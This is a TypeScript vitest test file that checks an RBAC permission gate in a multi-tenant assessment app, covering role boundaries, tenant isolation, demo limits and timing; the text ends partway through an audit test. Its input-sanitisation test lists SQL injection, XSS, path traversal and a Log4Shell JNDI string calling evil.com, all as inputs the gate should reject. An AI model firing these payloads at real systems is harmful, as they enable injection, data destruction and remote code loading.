/**
 * RBAC Security Validation and Audit Tests
 * Comprehensive security testing for permission boundary enforcement,
 * multi-tenant data isolation, demo user security, and vulnerability assessment
 */

import { describe, it, expect, beforeAll, afterAll } from "vitest";
import { db } from "../../apps/server/db";
import {
  users,
  organizations,
  assessmentCases,
  UserRole,
  ModuleType,
} from "../../packages/db/schema";
import { eq, and, or, ne } from "drizzle-orm";
import { rbacPermissionGate } from "../../apps/server/permissions/rbac-permission-gate";
import { ResourceType, ActionType } from "../../apps/server/permissions/types";
import bcrypt from "bcryptjs";

// Security test data for comprehensive vulnerability testing
const securityTestData = {
  organizations: [
    {
      id: "security-org-alpha",
      name: "Security Test Organization Alpha",
      customerId: "security-alpha-customer",
      assignedModules: [ModuleType.K12, ModuleType.POST_SECONDARY],
      maxUsers: 15,
      isActive: true,
    },
    {
      id: "security-org-beta",
      name: "Security Test Organization Beta",
      customerId: "security-beta-customer",
      assignedModules: [ModuleType.TUTORING],
      maxUsers: 10,
      isActive: true,
    },
    {
      id: "security-org-inactive",
      name: "Security Test Inactive Organization",
      customerId: "security-inactive-customer",
      assignedModules: [ModuleType.POST_SECONDARY],
      maxUsers: 5,
      isActive: false,
    },
  ],
  users: [
    // High-privilege users for privilege escalation testing
    {
      username: "security-developer",
      email: "security-developer@test.com",
      password: "SecurePassword123!",
      role: UserRole.DEVELOPER,
      assignedModules: [
        ModuleType.K12,
        ModuleType.POST_SECONDARY,
        ModuleType.TUTORING,
      ],
      organizationId: null,
      maxReports: -1,
      reportCount: 0,
    },
    {
      username: "security-admin",
      email: "security-admin@test.com",
      password: "SecurePassword123!",
      role: UserRole.ADMIN,
      assignedModules: [
        ModuleType.K12,
        ModuleType.POST_SECONDARY,
        ModuleType.TUTORING,
      ],
      organizationId: null,
      maxReports: -1,
      reportCount: 0,
    },
    // Organization users for multi-tenant security testing
    {
      username: "security-org-admin-alpha",
      email: "security-org-admin-alpha@test.com",
      password: "SecurePassword123!",
      role: UserRole.ORG_ADMIN,
      assignedModules: [ModuleType.K12, ModuleType.POST_SECONDARY],
      organizationId: "security-org-alpha",
      maxReports: -1,
      reportCount: 5,
    },
    {
      username: "security-org-admin-beta",
      email: "security-org-admin-beta@test.com",
      password: "SecurePassword123!",
      role: UserRole.ORG_ADMIN,
      assignedModules: [ModuleType.TUTORING],
      organizationId: "security-org-beta",
      maxReports: -1,
      reportCount: 3,
    },
    {
      username: "security-customer-alpha-1",
      email: "security-customer-alpha-1@test.com",
      password: "SecurePassword123!",
      role: UserRole.CUSTOMER,
      assignedModules: [ModuleType.K12],
      organizationId: "security-org-alpha",
      maxReports: -1,
      reportCount: 8,
    },
    {
      username: "security-customer-alpha-2",
      email: "security-customer-alpha-2@test.com",
      password: "SecurePassword123!",
      role: UserRole.CUSTOMER,
      assignedModules: [ModuleType.POST_SECONDARY],
      organizationId: "security-org-alpha",
      maxReports: -1,
      reportCount: 12,
    },
    {
      username: "security-customer-beta",
      email: "security-customer-beta@test.com",
      password: "SecurePassword123!",
      role: UserRole.CUSTOMER,
      assignedModules: [ModuleType.TUTORING],
      organizationId: "security-org-beta",
      maxReports: -1,
      reportCount: 6,
    },
    // Demo users for sandbox security testing
    {
      username: "security-demo-active",
      email: "security-demo-active@test.com",
      password: "SecurePassword123!",
      role: UserRole.DEMO,
      assignedModules: [ModuleType.POST_SECONDARY],
      organizationId: null,
      maxReports: 5,
      reportCount: 2,
    },
    {
      username: "security-demo-limit",
      email: "security-demo-limit@test.com",
      password: "SecurePassword123!",
      role: UserRole.DEMO,
      assignedModules: [ModuleType.K12],
      organizationId: null,
      maxReports: 5,
      reportCount: 5,
    },
    // Inactive user for security boundary testing
    {
      username: "security-inactive-user",
      email: "security-inactive@test.com",
      password: "SecurePassword123!",
      role: UserRole.CUSTOMER,
      assignedModules: [ModuleType.POST_SECONDARY],
      organizationId: "security-org-inactive",
      maxReports: -1,
      reportCount: 2,
      isActive: false,
    },
  ],
  assessmentCases: [
    // Alpha organization cases
    {
      caseId: "security-case-alpha-k12-1",
      displayName: "Security Alpha K12 Case 1",
      moduleType: ModuleType.K12,
      customerId: "security-alpha-customer",
      status: "completed",
      gradeBand: "elementary",
    },
    {
      caseId: "security-case-alpha-postsec-1",
      displayName: "Security Alpha Post-Secondary Case 1",
      moduleType: ModuleType.POST_SECONDARY,
      customerId: "security-alpha-customer",
      status: "in_progress",
    },
    {
      caseId: "security-case-alpha-sensitive",
      displayName: "Security Alpha Sensitive Case",
      moduleType: ModuleType.POST_SECONDARY,
      customerId: "security-alpha-customer",
      status: "completed",
    },
    // Beta organization cases
    {
      caseId: "security-case-beta-tutoring-1",
      displayName: "Security Beta Tutoring Case 1",
      moduleType: ModuleType.TUTORING,
      customerId: "security-beta-customer",
      status: "completed",
    },
    {
      caseId: "security-case-beta-confidential",
      displayName: "Security Beta Confidential Case",
      moduleType: ModuleType.TUTORING,
      customerId: "security-beta-customer",
      status: "in_progress",
    },
    // Inactive organization cases
    {
      caseId: "security-case-inactive-1",
      displayName: "Security Inactive Organization Case",
      moduleType: ModuleType.POST_SECONDARY,
      customerId: "security-inactive-customer",
      status: "completed",
    },
    // Demo cases for isolation testing
    {
      caseId: "security-demo-case-1",
      displayName: "Security Demo Case 1",
      moduleType: ModuleType.POST_SECONDARY,
      customerId: "demo-org",
      status: "completed",
    },
    {
      caseId: "security-demo-case-2",
      displayName: "Security Demo Case 2",
      moduleType: ModuleType.K12,
      customerId: "demo-org",
      status: "completed",
      gradeBand: "middle",
    },
  ],
};

describe("RBAC Security Validation and Audit", () => {
  let createdUserIds: number[] = [];
  let createdOrgIds: string[] = [];
  let createdCaseIds: string[] = [];
  let securityTestUsers: { [username: string]: Express.User } = {};

  beforeAll(async () => {
    console.log("🔒 Setting up RBAC security audit tests...");

    // Create test organizations
    for (const org of securityTestData.organizations) {
      await db.insert(organizations).values(org);
      createdOrgIds.push(org.id);
    }

    // Create test users
    for (const userData of securityTestData.users) {
      const hashedPassword = await bcrypt.hash(userData.password, 10);

      const [user] = await db
        .insert(users)
        .values({
          username: userData.username,
          email: userData.email,
          password: hashedPassword,
          role: userData.role,
          assignedModules: userData.assignedModules,
          organizationId: userData.organizationId,
          customerId: userData.organizationId
            ? securityTestData.organizations.find(
                (org) => org.id === userData.organizationId
              )?.customerId || "system"
            : userData.role === UserRole.DEMO
            ? "demo-org"
            : "system",
          maxReports: userData.maxReports,
          reportCount: userData.reportCount,
          isActive: userData.isActive !== false,
        })
        .returning();

      createdUserIds.push(user.id);
      securityTestUsers[userData.username] = user as Express.User;
    }

    // Create test assessment cases
    for (const caseData of securityTestData.assessmentCases) {
      await db.insert(assessmentCases).values({
        caseId: caseData.caseId,
        displayName: caseData.displayName,
        moduleType: caseData.moduleType,
        customerId: caseData.customerId,
        status: caseData.status,
        gradeBand: caseData.gradeBand,
        documentNames: [],
        reportData: {},
        itemMasterData: {},
      });
      createdCaseIds.push(caseData.caseId);
    }

    console.log(
      `✅ Created ${createdOrgIds.length} orgs, ${createdUserIds.length} users, ${createdCaseIds.length} cases for security testing`
    );
  });

  afterAll(async () => {
    console.log("🧹 Cleaning up security audit test data...");

    // Cleanup in reverse order
    for (const caseId of createdCaseIds) {
      await db
        .delete(assessmentCases)
        .where(eq(assessmentCases.caseId, caseId));
    }
    for (const userId of createdUserIds) {
      await db.delete(users).where(eq(users.id, userId));
    }
    for (const orgId of createdOrgIds) {
      await db.delete(organizations).where(eq(organizations.id, orgId));
    }

    console.log("✅ Security audit test cleanup completed");
  });

  describe("Permission Boundary Enforcement", () => {
    it("should prevent unauthorized access to admin resources", async () => {
      const unauthorizedUsers = [
        securityTestUsers["security-org-admin-alpha"],
        securityTestUsers["security-customer-alpha-1"],
        securityTestUsers["security-demo-active"],
      ];

      for (const user of unauthorizedUsers) {
        // Should not access admin dashboard
        const canAccessAdmin = await rbacPermissionGate.checkAccess(
          user,
          ResourceType.ADMIN,
          ActionType.VIEW
        );
        expect(canAccessAdmin).toBe(false);

        // Should not access system analytics
        const canViewAnalytics = await rbacPermissionGate.checkAccess(
          user,
          ResourceType.ADMIN,
          ActionType.MANAGE
        );
        expect(canViewAnalytics).toBe(false);

        // Should not edit system configuration
        const canEditConfig = await rbacPermissionGate.checkAccess(
          user,
          ResourceType.SYSTEM_CONFIG,
          ActionType.EDIT
        );
        expect(canEditConfig).toBe(false);

        // Should not edit prompts
        const canEditPrompts = await rbacPermissionGate.checkAccess(
          user,
          ResourceType.PROMPTS,
          ActionType.EDIT
        );
        expect(canEditPrompts).toBe(false);

        // Should not access database tables
        const canViewDatabase = await rbacPermissionGate.checkAccess(
          user,
          ResourceType.DATABASE,
          ActionType.VIEW
        );
        expect(canViewDatabase).toBe(false);

        const canEditDatabase = await rbacPermissionGate.checkAccess(
          user,
          ResourceType.DATABASE,
          ActionType.EDIT
        );
        expect(canEditDatabase).toBe(false);
      }
    });

    it("should prevent privilege escalation attempts", async () => {
      const lowPrivilegeUsers = [
        securityTestUsers["security-customer-alpha-1"],
        securityTestUsers["security-demo-active"],
      ];

      for (const user of lowPrivilegeUsers) {
        // Cannot manage users outside their scope
        const canManageAllUsers = await rbacPermissionGate.checkAccess(
          user,
          ResourceType.USERS,
          ActionType.MANAGE
        );
        expect(canManageAllUsers).toBe(false);

        // Cannot manage organizations
        const canManageOrgs = await rbacPermissionGate.checkAccess(
          user,
          ResourceType.ORGANIZATIONS,
          ActionType.MANAGE
        );
        expect(canManageOrgs).toBe(false);

        // Cannot switch modules
        const canSwitchModules = await rbacPermissionGate.checkAccess(
          user,
          ResourceType.MODULES,
          ActionType.SWITCH
        );
        expect(canSwitchModules).toBe(false);

        // Cannot access modules not assigned to them
        const unauthorizedModules = [
          ModuleType.K12,
          ModuleType.POST_SECONDARY,
          ModuleType.TUTORING,
        ].filter((module) => !user.assignedModules.includes(module));

        for (const module of unauthorizedModules) {
          const hasModuleAccess = await rbacPermissionGate.checkAccess(
            user,
            ResourceType.MODULES,
            ActionType.VIEW,
            { moduleType: module }
          );
          expect(hasModuleAccess).toBe(false);
        }
      }
    });

    it("should enforce strict role-based access boundaries", async () => {
      const roleBoundaryTests = [
        {
          user: securityTestUsers["security-org-admin-alpha"],
          role: UserRole.ORG_ADMIN,
          shouldNotAccess: [
            { resource: ResourceType.ADMIN, action: ActionType.VIEW },
            { resource: ResourceType.PROMPTS, action: ActionType.EDIT },
            { resource: ResourceType.SYSTEM_CONFIG, action: ActionType.EDIT },
            { resource: ResourceType.DATABASE, action: ActionType.VIEW },
            { resource: ResourceType.MODULES, action: ActionType.SWITCH },
          ],
          shouldAccess: [
            {
              resource: ResourceType.USERS,
              action: ActionType.MANAGE,
              context: { isOrgUser: true },
            },
            {
              resource: ResourceType.REPORTS,
              action: ActionType.VIEW,
              context: { isOrgReport: true },
            },
          ],
        },
        {
          user: securityTestUsers["security-customer-alpha-1"],
          role: UserRole.CUSTOMER,
          shouldNotAccess: [
            { resource: ResourceType.ADMIN, action: ActionType.VIEW },
            { resource: ResourceType.USERS, action: ActionType.MANAGE },
            { resource: ResourceType.MODULES, action: ActionType.SWITCH },
            {
              resource: ResourceType.REPORTS,
              action: ActionType.VIEW,
              context: { isOrgReport: true },
            },
          ],
          shouldAccess: [
            {
              resource: ResourceType.REPORTS,
              action: ActionType.VIEW,
              context: { isOwnReport: true },
            },
            { resource: ResourceType.REPORTS, action: ActionType.CREATE },
          ],
        },
        {
          user: securityTestUsers["security-demo-active"],
          role: UserRole.DEMO,
          shouldNotAccess: [
            { resource: ResourceType.ADMIN, action: ActionType.VIEW },
            { resource: ResourceType.USERS, action: ActionType.MANAGE },
            { resource: ResourceType.MODULES, action: ActionType.SWITCH },
            {
              resource: ResourceType.REPORTS,
              action: ActionType.VIEW,
              context: { isOrgReport: true },
            },
          ],
          shouldAccess: [
            {
              resource: ResourceType.REPORTS,
              action: ActionType.VIEW,
              context: { isOwnReport: true },
            },
            {
              resource: ResourceType.REPORTS,
              action: ActionType.CREATE,
              context: { currentReportCount: 2 },
            },
          ],
        },
      ];

      for (const test of roleBoundaryTests) {
        expect(test.user.role).toBe(test.role);

        // Test denied access
        for (const deniedAccess of test.shouldNotAccess) {
          const hasAccess = await rbacPermissionGate.checkAccess(
            test.user,
            deniedAccess.resource,
            deniedAccess.action,
            deniedAccess.context
          );
          expect(hasAccess).toBe(false);
        }

        // Test allowed access
        for (const allowedAccess of test.shouldAccess) {
          const hasAccess = await rbacPermissionGate.checkAccess(
            test.user,
            allowedAccess.resource,
            allowedAccess.action,
            allowedAccess.context
          );
          expect(hasAccess).toBe(true);
        }
      }
    });
  });

  describe("Multi-Tenant Data Isolation Security", () => {
    it("should prevent cross-organization data access", async () => {
      const alphaOrgUser = securityTestUsers["security-customer-alpha-1"];
      const betaOrgUser = securityTestUsers["security-customer-beta"];

      // Verify users are in different organizations
      expect(alphaOrgUser.organizationId).toBe("security-org-alpha");
      expect(betaOrgUser.organizationId).toBe("security-org-beta");
      expect(alphaOrgUser.customerId).toBe("security-alpha-customer");
      expect(betaOrgUser.customerId).toBe("security-beta-customer");

      // Alpha user should not access Beta organization resources
      const alphaCanAccessBetaOrg = await rbacPermissionGate.checkAccess(
        alphaOrgUser,
        ResourceType.REPORTS,
        ActionType.VIEW,
        { organizationId: "security-org-beta" }
      );
      expect(alphaCanAccessBetaOrg).toBe(false);

      // Beta user should not access Alpha organization resources
      const betaCanAccessAlphaOrg = await rbacPermissionGate.checkAccess(
        betaOrgUser,
        ResourceType.REPORTS,
        ActionType.VIEW,
        { organizationId: "security-org-alpha" }
      );
      expect(betaCanAccessAlphaOrg).toBe(false);
    });

    it("should validate strict data isolation at database level", async () => {
      // Verify assessment cases are properly isolated by customerId
      const alphaCases = await db
        .select()
        .from(assessmentCases)
        .where(eq(assessmentCases.customerId, "security-alpha-customer"));

      const betaCases = await db
        .select()
        .from(assessmentCases)
        .where(eq(assessmentCases.customerId, "security-beta-customer"));

      const demoCases = await db
        .select()
        .from(assessmentCases)
        .where(eq(assessmentCases.customerId, "demo-org"));

      // Each organization should have its own cases
      expect(alphaCases.length).toBeGreaterThan(0);
      expect(betaCases.length).toBeGreaterThan(0);
      expect(demoCases.length).toBeGreaterThan(0);

      // No cross-contamination between organizations
      const allCustomerIds = [
        ...alphaCases.map((c) => c.customerId),
        ...betaCases.map((c) => c.customerId),
        ...demoCases.map((c) => c.customerId),
      ];

      const uniqueCustomerIds = [...new Set(allCustomerIds)];
      expect(uniqueCustomerIds).toHaveLength(3);
      expect(uniqueCustomerIds).toContain("security-alpha-customer");
      expect(uniqueCustomerIds).toContain("security-beta-customer");
      expect(uniqueCustomerIds).toContain("demo-org");

      // Verify no cases leak between organizations
      alphaCases.forEach((case_) => {
        expect(case_.customerId).toBe("security-alpha-customer");
      });

      betaCases.forEach((case_) => {
        expect(case_.customerId).toBe("security-beta-customer");
      });

      demoCases.forEach((case_) => {
        expect(case_.customerId).toBe("demo-org");
      });
    });

    it("should prevent organization admin cross-access", async () => {
      const alphaOrgAdmin = securityTestUsers["security-org-admin-alpha"];
      const betaOrgAdmin = securityTestUsers["security-org-admin-beta"];

      // Alpha org admin should not manage Beta org users
      const alphaCanManageBetaUsers = await rbacPermissionGate.checkAccess(
        alphaOrgAdmin,
        ResourceType.USERS,
        ActionType.MANAGE,
        { organizationId: "security-org-beta" }
      );
      expect(alphaCanManageBetaUsers).toBe(false);

      // Beta org admin should not manage Alpha org users
      const betaCanManageAlphaUsers = await rbacPermissionGate.checkAccess(
        betaOrgAdmin,
        ResourceType.USERS,
        ActionType.MANAGE,
        { organizationId: "security-org-alpha" }
      );
      expect(betaCanManageAlphaUsers).toBe(false);

      // Verify they can only manage their own organization users
      const alphaCanManageOwnUsers = await rbacPermissionGate.checkAccess(
        alphaOrgAdmin,
        ResourceType.USERS,
        ActionType.MANAGE,
        { isOrgUser: true }
      );
      expect(alphaCanManageOwnUsers).toBe(true);

      const betaCanManageOwnUsers = await rbacPermissionGate.checkAccess(
        betaOrgAdmin,
        ResourceType.USERS,
        ActionType.MANAGE,
        { isOrgUser: true }
      );
      expect(betaCanManageOwnUsers).toBe(true);
    });

    it("should validate user-organization relationship integrity", async () => {
      // Verify all organization users have correct relationships
      const alphaUsers = await db
        .select()
        .from(users)
        .where(eq(users.organizationId, "security-org-alpha"));

      const betaUsers = await db
        .select()
        .from(users)
        .where(eq(users.organizationId, "security-org-beta"));

      // All Alpha org users should have Alpha customerId
      alphaUsers.forEach((user) => {
        expect(user.customerId).toBe("security-alpha-customer");
        expect(user.organizationId).toBe("security-org-alpha");
      });

      // All Beta org users should have Beta customerId
      betaUsers.forEach((user) => {
        expect(user.customerId).toBe("security-beta-customer");
        expect(user.organizationId).toBe("security-org-beta");
      });

      // Demo users should not be in any organization
      const demoUsers = await db
        .select()
        .from(users)
        .where(eq(users.role, UserRole.DEMO));

      demoUsers.forEach((user) => {
        expect(user.organizationId).toBeNull();
        expect(user.customerId).toBe("demo-org");
      });
    });
  });

  describe("Demo User Security and Limitations", () => {
    it("should enforce demo user sandbox isolation", async () => {
      const demoUsers = [
        securityTestUsers["security-demo-active"],
        securityTestUsers["security-demo-limit"],
      ];

      for (const demoUser of demoUsers) {
        // Demo users should be completely isolated from organizations
        expect(demoUser.organizationId).toBeNull();
        expect(demoUser.customerId).toBe("demo-org");
        expect(demoUser.role).toBe(UserRole.DEMO);

        // Cannot access any organization data
        const canAccessAlphaOrg = await rbacPermissionGate.checkAccess(
          demoUser,
          ResourceType.REPORTS,
          ActionType.VIEW,
          { organizationId: "security-org-alpha" }
        );
        expect(canAccessAlphaOrg).toBe(false);

        const canAccessBetaOrg = await rbacPermissionGate.checkAccess(
          demoUser,
          ResourceType.REPORTS,
          ActionType.VIEW,
          { organizationId: "security-org-beta" }
        );
        expect(canAccessBetaOrg).toBe(false);

        // Cannot view organization reports
        const canViewOrgReports = await rbacPermissionGate.checkAccess(
          demoUser,
          ResourceType.REPORTS,
          ActionType.VIEW,
          { isOrgReport: true }
        );
        expect(canViewOrgReports).toBe(false);

        // Cannot view all reports
        const canViewAllReports = await rbacPermissionGate.checkAccess(
          demoUser,
          ResourceType.REPORTS,
          ActionType.VIEW
        );
        expect(canViewAllReports).toBe(false);

        // Can only view own reports
        const canViewOwnReports = await rbacPermissionGate.checkAccess(
          demoUser,
          ResourceType.REPORTS,
          ActionType.VIEW,
          { isOwnReport: true }
        );
        expect(canViewOwnReports).toBe(true);
      }
    });

    it("should enforce demo user report limits securely", async () => {
      const activeDemoUser = securityTestUsers["security-demo-active"];
      const limitDemoUser = securityTestUsers["security-demo-limit"];

      // Active demo user (2 reports) should be able to create more
      expect(activeDemoUser.reportCount).toBe(2);
      expect(activeDemoUser.maxReports).toBe(5);

      const activeCanCreate = await rbacPermissionGate.checkAccess(
        activeDemoUser,
        ResourceType.REPORTS,
        ActionType.CREATE,
        { currentReportCount: 2 }
      );
      expect(activeCanCreate).toBe(true);

      // Limit demo user (5 reports) should not be able to create more
      expect(limitDemoUser.reportCount).toBe(5);
      expect(limitDemoUser.maxReports).toBe(5);

      const limitCanCreate = await rbacPermissionGate.checkAccess(
        limitDemoUser,
        ResourceType.REPORTS,
        ActionType.CREATE,
        { currentReportCount: 5 }
      );
      expect(limitCanCreate).toBe(false);

      // Test boundary conditions
      const canCreateAtLimit = await rbacPermissionGate.checkAccess(
        activeDemoUser,
        ResourceType.REPORTS,
        ActionType.CREATE,
        { currentReportCount: 5 }
      );
      expect(canCreateAtLimit).toBe(false);

      const canCreateOverLimit = await rbacPermissionGate.checkAccess(
        activeDemoUser,
        ResourceType.REPORTS,
        ActionType.CREATE,
        { currentReportCount: 6 }
      );
      expect(canCreateOverLimit).toBe(false);
    });

    it("should prevent demo user privilege escalation", async () => {
      const demoUser = securityTestUsers["security-demo-active"];

      // Demo users should have the most restrictive permissions
      const restrictedActions = [
        { resource: ResourceType.ADMIN, action: ActionType.VIEW },
        { resource: ResourceType.USERS, action: ActionType.MANAGE },
        { resource: ResourceType.ORGANIZATIONS, action: ActionType.VIEW },
        { resource: ResourceType.SYSTEM_CONFIG, action: ActionType.VIEW },
        { resource: ResourceType.PROMPTS, action: ActionType.VIEW },
        { resource: ResourceType.DATABASE, action: ActionType.VIEW },
        { resource: ResourceType.MODULES, action: ActionType.SWITCH },
      ];

      for (const action of restrictedActions) {
        const hasAccess = await rbacPermissionGate.checkAccess(
          demoUser,
          action.resource,
          action.action
        );
        expect(hasAccess).toBe(false);
      }

      // Demo users should only have basic report permissions
      const allowedActions = [
        {
          resource: ResourceType.REPORTS,
          action: ActionType.VIEW,
          context: { isOwnReport: true },
        },
        {
          resource: ResourceType.REPORTS,
          action: ActionType.CREATE,
          context: { currentReportCount: 2 },
        },
        { resource: ResourceType.REPORTS, action: ActionType.SHARE },
        {
          resource: ResourceType.MODULES,
          action: ActionType.VIEW,
          context: { moduleType: ModuleType.POST_SECONDARY },
        },
      ];

      for (const action of allowedActions) {
        const hasAccess = await rbacPermissionGate.checkAccess(
          demoUser,
          action.resource,
          action.action,
          action.context
        );
        expect(hasAccess).toBe(true);
      }
    });

    it("should validate demo data cleanup security", async () => {
      // Verify demo cases are properly isolated for cleanup
      const demoCases = await db
        .select()
        .from(assessmentCases)
        .where(eq(assessmentCases.customerId, "demo-org"));

      expect(demoCases.length).toBeGreaterThan(0);

      // All demo cases should be cleanly identifiable
      demoCases.forEach((case_) => {
        expect(case_.customerId).toBe("demo-org");
      });

      // Demo users should be cleanly identifiable for cleanup
      const demoUsers = await db
        .select()
        .from(users)
        .where(
          and(eq(users.role, UserRole.DEMO), eq(users.customerId, "demo-org"))
        );

      expect(demoUsers.length).toBeGreaterThan(0);

      demoUsers.forEach((user) => {
        expect(user.role).toBe(UserRole.DEMO);
        expect(user.customerId).toBe("demo-org");
        expect(user.organizationId).toBeNull();
        expect(user.maxReports).toBe(5);
      });
    });
  });

  describe("Security Vulnerability Assessment", () => {
    it("should prevent null/undefined user access", async () => {
      const nullUser = null as any;
      const undefinedUser = undefined as any;
      const emptyUser = {} as any;

      const testCases = [nullUser, undefinedUser, emptyUser];

      for (const invalidUser of testCases) {
        const hasAccess = await rbacPermissionGate.checkAccess(
          invalidUser,
          ResourceType.ADMIN,
          ActionType.VIEW
        );
        expect(hasAccess).toBe(false);

        const hasReportAccess = await rbacPermissionGate.checkAccess(
          invalidUser,
          ResourceType.REPORTS,
          ActionType.CREATE
        );
        expect(hasReportAccess).toBe(false);
      }
    });

    it("should handle inactive user security", async () => {
      const inactiveUser = securityTestUsers["security-inactive-user"];

      // Verify user is inactive
      expect(inactiveUser.isActive).toBe(false);

      // Inactive users should be denied all access
      const restrictedActions = [
        { resource: ResourceType.REPORTS, action: ActionType.CREATE },
        { resource: ResourceType.REPORTS, action: ActionType.VIEW },
        { resource: ResourceType.MODULES, action: ActionType.VIEW },
        { resource: ResourceType.USERS, action: ActionType.MANAGE },
        { resource: ResourceType.ADMIN, action: ActionType.VIEW },
      ];

      for (const action of restrictedActions) {
        const hasAccess = await rbacPermissionGate.checkAccess(
          inactiveUser,
          action.resource,
          action.action
        );
        expect(hasAccess).toBe(false);
      }
    });

    it("should validate input sanitization and injection prevention", async () => {
      const testUser = securityTestUsers["security-developer"];

      // Test with malicious input patterns
      const maliciousInputs = [
        "'; DROP TABLE users; --",
        "<script>alert('xss')</script>",
        "../../etc/passwd",
        "null",
        "undefined",
        "admin' OR '1'='1",
        "${jndi:ldap://evil.com/a}",
        "../../../admin",
      ];

      for (const maliciousInput of maliciousInputs) {
        // Test resource parameter
        const hasAccess1 = await rbacPermissionGate.checkAccess(
          testUser,
          maliciousInput,
          ActionType.VIEW
        );
        expect(hasAccess1).toBe(false);

        // Test action parameter
        const hasAccess2 = await rbacPermissionGate.checkAccess(
          testUser,
          ResourceType.REPORTS,
          maliciousInput
        );
        expect(hasAccess2).toBe(false);

        // Test context parameter
        const hasAccess3 = await rbacPermissionGate.checkAccess(
          testUser,
          ResourceType.REPORTS,
          ActionType.VIEW,
          { moduleType: maliciousInput }
        );
        expect(hasAccess3).toBe(false);
      }
    });

    it("should prevent role manipulation attacks", async () => {
      const customerUser = securityTestUsers["security-customer-alpha-1"];

      // Verify user's actual role
      expect(customerUser.role).toBe(UserRole.CUSTOMER);

      // Attempt to access admin resources (should fail)
      const canAccessAdmin = await rbacPermissionGate.checkAccess(
        customerUser,
        ResourceType.ADMIN,
        ActionType.VIEW
      );
      expect(canAccessAdmin).toBe(false);

      // Attempt to manipulate role through context (should fail)
      const canAccessWithFakeRole = await rbacPermissionGate.checkAccess(
        customerUser,
        ResourceType.ADMIN,
        ActionType.VIEW,
        { role: UserRole.DEVELOPER }
      );
      expect(canAccessWithFakeRole).toBe(false);

      // Verify permissions are based on actual user role, not context
      const permissions = rbacPermissionGate.getUserPermissions(
        customerUser.role,
        customerUser.assignedModules,
        customerUser.maxReports
      );
      expect(permissions.canAccessAdminDashboard).toBe(false);
      expect(permissions.canEditPrompts).toBe(false);
      expect(permissions.canManageUsers).toBe(false);
    });

    it("should validate session and authentication security", async () => {
      // Test with user missing required fields
      const incompleteUser = {
        id: 999,
        username: "incomplete",
        // Missing role, assignedModules, etc.
      } as any;

      const hasAccess = await rbacPermissionGate.checkAccess(
        incompleteUser,
        ResourceType.REPORTS,
        ActionType.CREATE
      );
      expect(hasAccess).toBe(false);

      // Test with user having invalid role
      const invalidRoleUser = {
        ...securityTestUsers["security-customer-alpha-1"],
        role: "invalid_role" as any,
      };

      const hasAccessInvalidRole = await rbacPermissionGate.checkAccess(
        invalidRoleUser,
        ResourceType.REPORTS,
        ActionType.CREATE
      );
      expect(hasAccessInvalidRole).toBe(false);
    });

    it("should prevent timing attacks on permission checks", async () => {
      const testUser = securityTestUsers["security-developer"];

      // Measure timing for valid and invalid permission checks
      const validChecks = [];
      const invalidChecks = [];

      // Valid permission checks
      for (let i = 0; i < 10; i++) {
        const start = process.hrtime.bigint();
        await rbacPermissionGate.checkAccess(
          testUser,
          ResourceType.ADMIN,
          ActionType.VIEW
        );
        const end = process.hrtime.bigint();
        validChecks.push(Number(end - start) / 1000000); // Convert to milliseconds
      }

      // Invalid permission checks
      for (let i = 0; i < 10; i++) {
        const start = process.hrtime.bigint();
        await rbacPermissionGate.checkAccess(
          testUser,
          "invalid_resource" as any,
          "invalid_action" as any
        );
        const end = process.hrtime.bigint();
        invalidChecks.push(Number(end - start) / 1000000);
      }

      // Calculate averages
      const avgValid =
        validChecks.reduce((a, b) => a + b, 0) / validChecks.length;
      const avgInvalid =
        invalidChecks.reduce((a, b) => a + b, 0) / invalidChecks.length;

      // Timing difference should be minimal (< 5ms difference)
      const timingDifference = Math.abs(avgValid - avgInvalid);
      expect(timingDifference).toBeLessThan(5);

      console.log(
        `Timing analysis - Valid: ${avgValid.toFixed(
          2
        )}ms, Invalid: ${avgInvalid.toFixed(
          2
        )}ms, Difference: ${timingDifference.toFixed(2)}ms`
      );
    });
  });

  describe("Performance and Scalability Security", () => {
    it("should handle high-volume permission checks efficiently", async () => {
      const testUsers = Object.values(securityTestUsers).slice(0, 5);
      const resources = [
        ResourceType.REPORTS,
        ResourceType.MODULES,
        ResourceType.ADMIN,
        ResourceType.USERS,
      ];
      const actions = [ActionType.VIEW, ActionType.CREATE, ActionType.MANAGE];

      const startTime = Date.now();
      const promises = [];

      // Generate 100 permission checks
      for (let i = 0; i < 100; i++) {
        const user = testUsers[i % testUsers.length];
        const resource = resources[i % resources.length];
        const action = actions[i % actions.length];

        promises.push(rbacPermissionGate.checkAccess(user, resource, action));
      }

      const results = await Promise.all(promises);
      const endTime = Date.now();

      // Should complete within reasonable time (< 500ms for 100 checks)
      expect(endTime - startTime).toBeLessThan(500);

      // All results should be boolean
      results.forEach((result) => {
        expect(typeof result).toBe("boolean");
      });

      console.log(
        `Performance test: 100 permission checks completed in ${
          endTime - startTime
        }ms`
      );
    });

    it("should prevent resource exhaustion attacks", async () => {
      const testUser = securityTestUsers["security-developer"];

      // Test with large context objects
      const largeContext = {
        data: "x".repeat(10000), // 10KB string
        array: new Array(1000).fill("test"),
        nested: {
          level1: { level2: { level3: { data: "deep" } } },
        },
      };

      const startTime = Date.now();
      const hasAccess = await rbacPermissionGate.checkAccess(
        testUser,
        ResourceType.REPORTS,
        ActionType.VIEW,
        largeContext
      );
      const endTime = Date.now();

      // Should handle large context efficiently (< 50ms)
      expect(endTime - startTime).toBeLessThan(50);
      expect(typeof hasAccess).toBe("boolean");
    });

    it("should validate concurrent access security", async () => {
      const testUsers = Object.values(securityTestUsers);

      // Simulate concurrent permission checks from multiple users
      const concurrentPromises = testUsers.map((user) =>
        Promise.all([
          rbacPermissionGate.checkAccess(
            user,
            ResourceType.REPORTS,
            ActionType.CREATE
          ),
          rbacPermissionGate.checkAccess(
            user,
            ResourceType.MODULES,
            ActionType.VIEW
          ),
          rbacPermissionGate.checkAccess(
            user,
            ResourceType.ADMIN,
            ActionType.VIEW
          ),
        ])
      );

      const startTime = Date.now();
      const results = await Promise.all(concurrentPromises);
      const endTime = Date.now();

      // Should handle concurrent access efficiently
      expect(endTime - startTime).toBeLessThan(200);

      // Verify all results are valid
      results.forEach((userResults) => {
        userResults.forEach((result) => {
          expect(typeof result).toBe("boolean");
        });
      });

      console.log(
        `Concurrent access test: ${
          testUsers.length
        } users × 3 checks completed in ${endTime - startTime}ms`
      );
    });
  });

  describe("Audit Trail and Monitoring", () => {
    it("should provide comprehensive permission audit information", async () => {
      const testUser = securityTestUsers["security-org-admin-alpha"];

      // Get user permissions for audit
      const permissions = rbacPermissionGate.getUserPermissions(
        testUser.role,
        testUser.assignedModules,
        testUser.maxReports
      );

      // Verify audit trail data is complete
      expect(permissions).toHaveProperty("canSwitchModules");
